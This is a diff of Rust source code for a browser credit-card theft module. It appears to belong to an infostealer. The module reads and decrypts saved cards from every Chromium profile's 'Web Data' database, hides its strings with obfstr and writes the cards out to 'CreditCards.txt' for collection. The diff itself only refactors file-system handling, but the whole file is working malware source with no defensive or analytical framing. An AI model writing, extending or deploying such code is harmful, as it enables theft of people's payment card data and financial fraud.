@@ -1,11 +1,13 @@
 use crate::alloc::borrow::ToOwned;
-use crate::chromium::{BrowserData, decrypt_data};
-use crate::{CreditCard, collect_and_read_sqlite_from_all_profiles, to_string_and_write_all};
+use crate::chromium::{decrypt_data, BrowserData};
+use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, CreditCard};
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
 use database::TableRecord;
+use filesystem::storage::StorageFileSystem;
+use filesystem::FileSystem;
 use obfstr::obfstr as s;
-use tasks::{Task, parent_name};
+use tasks::{parent_name, Task};
 use utils::path::Path;
 
 const CREDIT_CARDS_NAME_ON_CARD: usize = 1;
@@ -24,12 +26,13 @@ impl CreditCardsTask {
     }
 }
 
-impl<C: Collector> Task<C> for CreditCardsTask {
+impl<C: Collector, F: FileSystem> Task<C, F> for CreditCardsTask {
     parent_name!("CreditCards.txt");
 
-    fn run(&self, parent: &Path, collector: &C) {
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
         let Some(mut credit_cards) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
+            &StorageFileSystem,
             |profile| profile / s!("Web Data"),
             s!("Credit_cards"),
             |record| extract_card_from_record(record, &self.browser),
@@ -38,10 +41,12 @@ impl<C: Collector> Task<C> for CreditCardsTask {
         };
 
         credit_cards.sort_by(|a, b| b.use_count.cmp(&a.use_count));
+        
         collector
             .get_browser()
             .increase_credit_cards_by(credit_cards.len());
-        let _ = to_string_and_write_all(&credit_cards, "\n\n", parent);
+        
+        let _ = to_string_and_write_all(&credit_cards, "\n\n", filesystem, parent);
     }
 }
 
